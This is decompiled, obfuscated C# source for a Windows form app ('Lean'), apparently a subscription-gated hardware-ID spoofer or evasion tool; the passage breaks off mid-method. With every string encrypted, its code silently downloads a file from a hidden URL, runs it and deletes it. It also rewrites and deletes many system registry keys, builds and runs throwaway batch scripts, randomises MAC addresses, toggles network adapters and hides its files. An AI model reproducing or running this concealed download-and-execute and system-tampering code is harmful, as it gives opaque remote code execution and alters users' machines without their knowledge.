using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Lean.Addons;
using LeanDevelopment.Properties;
using Microsoft.Win32;
using Siticone.UI.AnimatorNS;
using Siticone.UI.WinForms;

namespace Lean.Forms
{
	// Token: 0x02000009 RID: 9
	public partial class Main : Form
	{
		// Token: 0x06000038 RID: 56 RVA: 0x000035B4 File Offset: 0x000017B4
		public Main()
		{
			System.Timers.Timer timer = new System.Timers.Timer(50.0);
			timer.AutoReset = true;
			timer.Elapsed += Main.MyMethod;
			timer.Start();
			this.by();
			this.u.BringToFront();
		}

		// Token: 0x06000039 RID: 57 RVA: 0x0000219A File Offset: 0x0000039A
		private void a(object sender, EventArgs e)
		{
			Environment.Exit(0);
		}

		// Token: 0x0600003A RID: 58 RVA: 0x000021A2 File Offset: 0x000003A2
		public static void MyMethod(object sender, ElapsedEventArgs e)
		{
			Main.au();
		}

		// Token: 0x0600003B RID: 59 RVA: 0x00003624 File Offset: 0x00001824
		public static void MyMethod2(object sender, ElapsedEventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName(global::i.a("", 58669));
			if (processesByName.Length != 0)
			{
				Thread.Sleep(1000);
				new Process
				{
					StartInfo = 
					{
						FileName = global::i.a("", 59695),
						CreateNoWindow = true,
						RedirectStandardInput = true,
						RedirectStandardOutput = true,
						UseShellExecute = false,
						Verb = global::i.a("", 59621),
						Arguments = global::i.a("", 58406)
					}
				}.Start();
				Application.Exit();
			}
		}

		// Token: 0x0600003C RID: 60 RVA: 0x000036E8 File Offset: 0x000018E8
		private void b(object sender, EventArgs e)
		{
			this.n.Text = Login.KeyAuthApp.user_data.username;
			this.bq.Hide();
			this.br.Hide();
			int num = Convert.ToInt32(Login.KeyAuthApp.app_data.numUsers);
			this.bo.Text = global::i.a("", 63459) + num.ToString();
			Main.au();
			Process[] processesByName = Process.GetProcessesByName(global::i.a("", 57404));
			if (processesByName.Length == 0)
			{
				string path = global::i.a("", 58676);
				if (!Directory.Exists(path))
				{
					DirectoryInfo directoryInfo = Directory.CreateDirectory(path);
					directoryInfo.Attributes = (FileAttributes.Hidden | FileAttributes.Directory);
				}
				else
				{
					Directory.CreateDirectory(global::i.a("", 58676));
					DirectoryInfo directoryInfo2 = Directory.CreateDirectory(path);
					directoryInfo2.Attributes = (FileAttributes.Hidden | FileAttributes.Directory);
				}
				this.bj.Show();
				this.bc.Hide();
				this.bl.Hide();
				this.bm.Hide();
				this.bu.Hide();
				this.be.Hide();
				if (Login.KeyAuthApp.user_data.subscriptions[0].subscription == global::i.a("", 62255))
				{
					this.bj.Hide();
					this.bc.Show();
					this.bl.Show();
					this.bm.Show();
					this.bu.Show();
					this.be.Show();
				}
				else if (Login.KeyAuthApp.user_data.subscriptions[0].subscription == global::i.a("", 58076))
				{
					this.bj.Hide();
					this.bc.Show();
					this.bl.Show();
					this.bm.Show();
					this.bu.Show();
					this.be.Show();
				}
				this.u.BringToFront();
				Login.KeyAuthApp.check();
				this.m.Text = Login.KeyAuthApp.user_data.subscriptions[0].subscription;
				this.p.Text = global::i.a("", 60519) + Login.KeyAuthApp.app_data.version;
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
				WebRequest webRequest = WebRequest.Create(global::i.a("", 59151));
				WebResponse response = webRequest.GetResponse();
				Stream responseStream = response.GetResponseStream();
				StreamReader streamReader = new StreamReader(responseStream);
				streamReader.ReadToEnd();
				WebRequest webRequest2 = WebRequest.Create(global::i.a("", 59997));
				WebResponse response2 = webRequest2.GetResponse();
				Stream responseStream2 = response2.GetResponseStream();
				StreamReader streamReader2 = new StreamReader(responseStream2);
				streamReader2.ReadToEnd();
				global::i.a("", 58676);
				global::i.a("", 62410);
				global::i.a("", 61431);
				global::i.a("", 60911);
			}
			else
			{
				base.Hide();
				MessageBox.Show(global::i.a("", 60903), global::i.a("", 60277), MessageBoxButtons.OK);
				Application.Exit();
			}
		}

		// Token: 0x0600003D RID: 61 RVA: 0x00003A58 File Offset: 0x00001C58
		public DateTime UnixTimeToDateTime(long unixtime)
		{
			DateTime result = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Local);
			return result;
		}

		// Token: 0x0600003E RID: 62 RVA: 0x000021A9 File Offset: 0x000003A9
		private void c(object sender, EventArgs e)
		{
		}

		// Token: 0x0600003F RID: 63 RVA: 0x00003A7C File Offset: 0x00001C7C
		private void d(object sender, EventArgs e)
		{
			DateTime now = DateTime.Now;
			this.aw.Text = string.Format(global::i.a("", 58236), new object[]
			{
				now.Day,
				now.Month,
				now.Year,
				now.Hour,
				now.Minute,
				now.Second
			});
		}

		// Token: 0x06000040 RID: 64 RVA: 0x000021A9 File Offset: 0x000003A9
		private void e(object sender, EventArgs e)
		{
		}

		// Token: 0x06000041 RID: 65 RVA: 0x000021A9 File Offset: 0x000003A9
		private void f(object sender, EventArgs e)
		{
		}

		// Token: 0x06000042 RID: 66 RVA: 0x000021A9 File Offset: 0x000003A9
		private void g(object sender, EventArgs e)
		{
		}

		// Token: 0x06000043 RID: 67 RVA: 0x000021A9 File Offset: 0x000003A9
		private void h(object sender, EventArgs e)
		{
		}

		// Token: 0x06000044 RID: 68 RVA: 0x000021A9 File Offset: 0x000003A9
		private void i(object sender, EventArgs e)
		{
		}

		// Token: 0x06000045 RID: 69 RVA: 0x000021A9 File Offset: 0x000003A9
		private void j(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000046 RID: 70 RVA: 0x000021A9 File Offset: 0x000003A9
		private void k(object sender, EventArgs e)
		{
		}

		// Token: 0x06000047 RID: 71 RVA: 0x000021A9 File Offset: 0x000003A9
		private void l(object sender, EventArgs e)
		{
		}

		// Token: 0x06000048 RID: 72 RVA: 0x000021AB File Offset: 0x000003AB
		private void m(object sender, EventArgs e)
		{
			this.u.BringToFront();
		}

		// Token: 0x06000049 RID: 73 RVA: 0x000021A9 File Offset: 0x000003A9
		private void n(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004A RID: 74 RVA: 0x000021A9 File Offset: 0x000003A9
		private void o(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004B RID: 75 RVA: 0x000021A9 File Offset: 0x000003A9
		private void p(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004C RID: 76 RVA: 0x000021A9 File Offset: 0x000003A9
		private void q(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x0600004D RID: 77 RVA: 0x000021A9 File Offset: 0x000003A9
		private void r(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x0600004E RID: 78 RVA: 0x000021A9 File Offset: 0x000003A9
		private void s(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004F RID: 79 RVA: 0x000021A9 File Offset: 0x000003A9
		private void t(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000050 RID: 80 RVA: 0x000021A9 File Offset: 0x000003A9
		private void u(object sender, EventArgs e)
		{
		}

		// Token: 0x06000051 RID: 81 RVA: 0x000021A9 File Offset: 0x000003A9
		private void v(object sender, EventArgs e)
		{
		}

		// Token: 0x06000052 RID: 82 RVA: 0x00003B10 File Offset: 0x00001D10
		private void w(object sender, EventArgs e)
		{
			string path = global::i.a("", 60731);
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			if (File.Exists(global::i.a("", 58061)))
			{
				Process.Start(global::i.a("", 58061));
				Thread.Sleep(1000);
				File.Delete(global::i.a("", 58061));
			}
			else
			{
				string address = global::i.a("", 57744);
				string fileName = global::i.a("", 58061);
				WebClient webClient = new WebClient();
				webClient.DownloadFile(address, fileName);
				File.SetAttributes(global::i.a("", 58061), FileAttributes.Hidden);
				Thread.Sleep(1000);
				Process.Start(global::i.a("", 58061));
				Thread.Sleep(1000);
				File.Delete(global::i.a("", 58061));
			}
		}

		// Token: 0x06000053 RID: 83 RVA: 0x000021A9 File Offset: 0x000003A9
		private void x(object sender, EventArgs e)
		{
		}

		// Token: 0x06000054 RID: 84 RVA: 0x000021A9 File Offset: 0x000003A9
		private void y(object sender, EventArgs e)
		{
		}

		// Token: 0x06000055 RID: 85 RVA: 0x000021A9 File Offset: 0x000003A9
		private void z(object sender, EventArgs e)
		{
		}

		// Token: 0x06000056 RID: 86 RVA: 0x00003C14 File Offset: 0x00001E14
		public static void Enable_LocalAreaConection(string adapterId, bool enable = true)
		{
			string str = global::i.a("", 60614);
			foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
			{
				if (networkInterface.Id == adapterId)
				{
					str = networkInterface.Name;
					IL_4A:
					string str2;
					if (enable)
					{
						str2 = global::i.a("", 62119);
					}
					else
					{
						str2 = global::i.a("", 61332);
					}
					ProcessStartInfo startInfo = new ProcessStartInfo(global::i.a("", 63172), global::i.a("", 62719) + str + global::i.a("", 61498) + str2);
					Process process = new Process();
					process.StartInfo = startInfo;
					process.Start();
					process.StartInfo.CreateNoWindow = true;
					process.WaitForExit();
					return;
				}
			}
			goto IL_4A;
		}

		// Token: 0x06000057 RID: 87 RVA: 0x00003CF0 File Offset: 0x00001EF0
		public static string RandomMac()
		{
			string text = global::i.a("", 60144);
			string text2 = global::i.a("", 62182);
			string text3 = "";
			Random random = new Random();
			text3 += text[random.Next(text.Length)].ToString();
			text3 += text2[random.Next(text2.Length)].ToString();
			for (int i = 0; i < 5; i++)
			{
				text3 += global::i.a("", 59507);
				text3 += text[random.Next(text.Length)].ToString();
				text3 += text[random.Next(text.Length)].ToString();
			}
			return text3;
		}

		// Token: 0x06000058 RID: 88 RVA: 0x000021AB File Offset: 0x000003AB
		private void aa(object sender, EventArgs e)
		{
			this.u.BringToFront();
		}

		// Token: 0x06000059 RID: 89 RVA: 0x00003DE0 File Offset: 0x00001FE0
		public static string RandomString(int length)
		{
			return new string(Enumerable.Repeat<string>(global::i.a("", 60445), length).Select(new Func<string, char>(Main.<>c.<>9.a)).ToArray<char>());
		}

		// Token: 0x0600005A RID: 90 RVA: 0x00003E34 File Offset: 0x00002034
		private void ab(object sender, EventArgs e)
		{
			Registry.SetValue(global::i.a("", 59507), global::i.a("", 61330), global::i.a("", 58477), RegistryValueKind.String);
			Registry.SetValue(global::i.a("", 59507), global::i.a("", 59194), global::i.a("", 58477), RegistryValueKind.String);
			Registry.SetValue(global::i.a("", 59726), global::i.a("", 60456), global::i.a("", 62274), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 61429), global::i.a("", 57524), global::i.a("", 62274), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 61089), global::i.a("", 59672), global::i.a("", 58419), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 63698), "", global::i.a("", 63487));
			Registry.SetValue(global::i.a("", 59238), "", global::i.a("", 61122));
			Registry.SetValue(global::i.a("", 59342), global::i.a("", 61977), global::i.a("", 58419));
			Registry.SetValue(global::i.a("", 59342), global::i.a("", 60139), global::i.a("", 58140));
			Registry.SetValue(global::i.a("", 59342), global::i.a("", 59584), global::i.a("", 62274));
			Registry.SetValue(global::i.a("", 59342), global::i.a("", 61894), global::i.a("", 58540));
			Registry.SetValue(global::i.a("", 59342), global::i.a("", 61505), global::i.a("", 58140));
			Registry.SetValue(global::i.a("", 63220), global::i.a("", 63546), global::i.a("", 62274));
			Registry.SetValue(global::i.a("", 58108), global::i.a("", 62097), global::i.a("", 59679), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 58108), global::i.a("", 59893), global::i.a("", 59679), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 58108), global::i.a("", 58829), global::i.a("", 59679), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 58108), global::i.a("", 57426), global::i.a("", 59679), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 58108), global::i.a("", 60358), global::i.a("", 59679), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 57699), global::i.a("", 59303), global::i.a("", 58540));
			Registry.SetValue(global::i.a("", 58375), global::i.a("", 58806), global::i.a("", 58227), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 57655), global::i.a("", 58806), global::i.a("", 58227), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 61479), global::i.a("", 58806), global::i.a("", 58227), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 57890), global::i.a("", 58806), global::i.a("", 58227), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 57780), global::i.a("", 58588), global::i.a("", 62274), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 57780), global::i.a("", 57383), global::i.a("", 58419), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 62205), global::i.a("", 62566), 1, RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 59456), global::i.a("", 58055), 8, RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 59456), global::i.a("", 58650), 6, RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 59456), global::i.a("", 59597), global::i.a("", 61336), RegistryValueKind.String);
			Registry.SetValue(global::i.a("", 59456), global::i.a("", 62618), global::i.a("", 61336), RegistryValueKind.String);
			Registry.SetValue(global::i.a("", 59709), global::i.a("", 58055), 0, RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 59709), global::i.a("", 58650), 8, RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 59709), global::i.a("", 59597), global::i.a("", 63658), RegistryValueKind.String);
			Registry.SetValue(global::i.a("", 59709), global::i.a("", 62618), global::i.a("", 61336), RegistryValueKind.String);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 59261), true).DeleteValue(global::i.a("", 61330), false);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 59261), true).DeleteValue(global::i.a("", 59194), false);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 61865), true).DeleteValue(global::i.a("", 60456), false);
			Registry.SetValue(global::i.a("", 61429), global::i.a("", 57524), global::i.a("", 58419), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 61089), global::i.a("", 59672), global::i.a("", 62274), RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree(global::i.a("", 62387), false);
			Registry.ClassesRoot.DeleteSubKeyTree(global::i.a("", 60484), false);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 61469), true).DeleteValue(global::i.a("", 61977), false);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 61469), true).DeleteValue(global::i.a("", 60139), false);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 61469), true).DeleteValue(global::i.a("", 61894), false);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 61469), true).DeleteValue(global::i.a("", 61505), false);
			Registry.SetValue(global::i.a("", 59342), global::i.a("", 59584), global::i.a("", 62829));
			Registry.SetValue(global::i.a("", 63220), global::i.a("", 63546), global::i.a("", 62829));
			Registry.CurrentUser.OpenSubKey(global::i.a("", 57759), true).DeleteValue(global::i.a("", 62097), false);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 57759), true).DeleteValue(global::i.a("", 59893), false);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 57759), true).DeleteValue(global::i.a("", 58829), false);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 57759), true).DeleteValue(global::i.a("", 57426), false);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 57759), true).DeleteValue(global::i.a("", 60358), false);
			Registry.SetValue(global::i.a("", 57699), global::i.a("", 59303), global::i.a("", 59994));
			Registry.SetValue(global::i.a("", 58375), global::i.a("", 58806), global::i.a("", 58555), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 61479), global::i.a("", 58806), global::i.a("", 58555), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 57890), global::i.a("", 58806), global::i.a("", 58555), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 57780), global::i.a("", 58588), global::i.a("", 58419), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 57780), global::i.a("", 57383), global::i.a("", 62274), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 62205), global::i.a("", 62566), 14, RegistryValueKind.DWord);
			Registry.LocalMachine.OpenSubKey(global::i.a("", 63458), true).DeleteValue(global::i.a("", 58055), false);
			Registry.LocalMachine.OpenSubKey(global::i.a("", 63458), true).DeleteValue(global::i.a("", 58650), false);
			Registry.LocalMachine.OpenSubKey(global::i.a("", 63458), true).DeleteValue(global::i.a("", 59597), false);
			Registry.LocalMachine.OpenSubKey(global::i.a("", 63458), true).DeleteValue(global::i.a("", 62618), false);
			Registry.LocalMachine.OpenSubKey(global::i.a("", 58705), true).DeleteValue(global::i.a("", 58055), false);
			Registry.LocalMachine.OpenSubKey(global::i.a("", 58705), true).DeleteValue(global::i.a("", 58650), false);
			Registry.LocalMachine.OpenSubKey(global::i.a("", 58705), true).DeleteValue(global::i.a("", 59597), false);
			Registry.LocalMachine.OpenSubKey(global::i.a("", 58705), true).DeleteValue(global::i.a("", 62618), false);
			Registry.SetValue(global::i.a("", 59128), global::i.a("", 61737), global::i.a("", 62274), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 60839), global::i.a("", 62549), global::i.a("", 62274), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 62852), global::i.a("", 59900), global::i.a("", 62274), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 62852), global::i.a("", 63192), global::i.a("", 58419), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 62852), global::i.a("", 62754), global::i.a("", 58419), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 62852), global::i.a("", 61923), global::i.a("", 58419), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 62850), global::i.a("", 58089), global::i.a("", 58419), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 62827), global::i.a("", 57629), global::i.a("", 58419), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 60906), global::i.a("", 58806), global::i.a("", 62274), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 60093), global::i.a("", 58207), 0);
			Registry.SetValue(global::i.a("", 61780), global::i.a("", 62112), global::i.a("", 58419), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 61780), global::i.a("", 61281), global::i.a("", 58419), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 61780), global::i.a("", 58445), global::i.a("", 58419), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 61780), global::i.a("", 60041), global::i.a("", 62274), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 63300), global::i.a("", 63590), global::i.a("", 58419), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 63123), global::i.a("", 60779), 0);
			Registry.SetValue(global::i.a("", 58062), global::i.a("", 62811), 1);
			Registry.SetValue(global::i.a("", 61042), global::i.a("", 60178), global::i.a("", 62274), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 61780), global::i.a("", 61001), global::i.a("", 62274), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 63105), global::i.a("", 59987), global::i.a("", 58419), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 61780), global::i.a("", 61244), global::i.a("", 58419), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 61780), global::i.a("", 63590), global::i.a("", 58419), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 62205), global::i.a("", 62960), global::i.a("", 62274), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 62205), global::i.a("", 61210), global::i.a("", 62274), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 63553), global::i.a("", 63146), global::i.a("", 58419), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 63553), global::i.a("", 57629), global::i.a("", 58419), RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree(global::i.a("", 59853), false);
			Registry.SetValue(global::i.a("", 63300), global::i.a("", 60581), global::i.a("", 58419), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 63300), global::i.a("", 59417), global::i.a("", 58419), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 63300), global::i.a("", 59330), global::i.a("", 58419), RegistryValueKind.DWord);
			try
			{
				if (this.ao.Text == global::i.a("", 61704))
				{
					try
					{
						if (File.Exists(global::i.a("", 58616)))
						{
							File.Move(global::i.a("", 60785), global::i.a("", 60136));
							File.Move(global::i.a("", 61780), global::i.a("", 60268));
						}
						if (Directory.Exists(global::i.a("", 60769)))
						{
							Directory.Delete(global::i.a("", 60769));
							Directory.CreateDirectory(global::i.a("", 60769));
						}
						d d = new d();
						d.b();
					}
					catch
					{
					}
					string text = Path.ChangeExtension(Path.GetTempFileName(), global::i.a("", 58592));
					using (StreamWriter streamWriter = new StreamWriter(text))
					{
						streamWriter.WriteLine(global::i.a("", 57366));
						streamWriter.WriteLine(global::i.a("", 57391));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 63514));
						streamWriter.WriteLine(global::i.a("", 57391));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 58748));
						streamWriter.WriteLine(global::i.a("", 57391));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 59971));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 58763));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 62546));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 58249));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 59971));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 57591));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 62665));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 59384));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 60592));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 57472));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 59191));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 58091));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 61163));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 62511));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 59730));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 61163));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 57576));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 61930));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 58091));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 59376));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 58091));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 62125));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 58541));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 61734));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 58141));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 58757));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 62127));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 60615));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 63016));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 63475));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 60774));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 60959));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 62371));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 62180));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 63512));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 60099));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 63398));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 58030));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 57391));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 59155));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 63610));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 60692));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 63496));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 63471));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 63605));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 62077));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 58019));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 62296));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 63561));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 59252));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 59517));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 59931));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 58860));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 59857));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 62140));
						streamWriter.WriteLine(global::i.a("", 58026));
						streamWriter.WriteLine(global::i.a("", 61566));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 60601));
						streamWriter.WriteLine(global::i.a("", 57711));
						streamWriter.WriteLine(global::i.a("", 57784));
						streamWriter.WriteLine(global::i.a("", 58929));
						streamWriter.WriteLine(global::i.a("", 61950));
						streamWriter.WriteLine(global::i.a("", 60426));
						streamWriter.WriteLine(global::i.a("", 59552));
						streamWriter.WriteLine(global::i.a("", 62940));
						streamWriter.WriteLine(global::i.a("", 61498));
						streamWriter.WriteLine(global::i.a("", 60426));
						streamWriter.WriteLine(global::i.a("", 62928));
						streamWriter.WriteLine(global::i.a("", 59778));
						streamWriter.WriteLine(global::i.a("", 62201));
						streamWriter.WriteLine(global::i.a("", 60504));
						streamWriter.WriteLine(global::i.a("", 58177));
						streamWriter.WriteLine(global::i.a("", 63100));
						streamWriter.WriteLine(global::i.a("", 57701));
						streamWriter.WriteLine(global::i.a("", 62953));
						streamWriter.WriteLine(global::i.a("", 59232));
						streamWriter.WriteLine(global::i.a("", 59395));
						streamWriter.WriteLine(global::i.a("", 59729));
						streamWriter.WriteLine(global::i.a("", 58657));
						streamWriter.WriteLine(global::i.a("", 60912));
						streamWriter.WriteLine(global::i.a("", 58454));
						streamWriter.WriteLine(global::i.a("", 60992));
						streamWriter.WriteLine(global::i.a("", 57945));
						streamWriter.WriteLine(global::i.a("", 59089));
						streamWriter.WriteLine(global::i.a("", 59971));
						streamWriter.WriteLine(global::i.a("", 62371));
						streamWriter.WriteLine(global::i.a("", 57635));
						streamWriter.WriteLine(global::i.a("", 59457));
						streamWriter.WriteLine(global::i.a("", 58138));
						streamWriter.WriteLine(global::i.a("", 59735));
						streamWriter.WriteLine(global::i.a("", 59065));
					}
					Process process = Process.Start(text);
					process.WaitForExit();
					File.Delete(text);
					string path = global::i.a("", 59056);
					if (!Directory.Exists(path))
					{
						Directory.CreateDirectory(path);
					}
					if (File.Exists(global::i.a("", 58616)))
					{
						Process.Start(global::i.a("", 58616));
					}
					else
					{
						string text2 = global::i.a("", 58616);
						using (StreamWriter streamWriter2 = File.CreateText(text2))
						{
							streamWriter2.WriteLine(global::i.a("", 57802));
						}
						Process process2 = new Process();
						process2.StartInfo.FileName = text2;
						this.d.Add(process2);
						File.SetAttributes(global::i.a("", 58616), FileAttributes.Hidden);
						process2.Start();
					}
					string text3 = Path.ChangeExtension(Path.GetTempFileName(), global::i.a("", 58592));
					using (StreamWriter streamWriter3 = new StreamWriter(text3))
					{
						streamWriter3.WriteLine(global::i.a("", 57366));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 61056));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 63655));
						streamWriter3.WriteLine(global::i.a("", 59089));
						streamWriter3.WriteLine(global::i.a("", 59971));
